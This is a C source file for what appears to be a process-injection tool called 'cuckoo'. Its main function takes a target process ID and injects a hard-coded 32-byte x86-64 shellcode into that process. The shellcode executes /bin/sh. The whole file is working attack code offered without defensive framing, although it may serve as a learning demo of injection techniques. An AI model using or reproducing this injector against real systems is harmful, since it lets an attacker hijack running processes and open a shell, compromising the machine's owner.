#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "utils.h"
#include "cuckoo.h"
#include "shellcode.h"


int main(int argc, char *argv[])
{
    if(argc != 2){
        usage(argv[0]);
        return 0;
    }
    
    pid_t target_pid = atoi(argv[1]);
    unsigned char shellcode[] = "\x48\x31\xc0\x48\x89\xc2\x48\x89"
        "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
        "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
        "\x2f\x73\x68\x00\xcc\x90\x90\x90";

    // DO NOT use strlen(), because shellcode has '\x00'
    size_t shellcode_len = 32; 
    
    if (injectShellcode(target_pid, shellcode, shellcode_len) != CUCKOO_OK)
    {
        oops("error ", 1);
    }
    return 0;
}
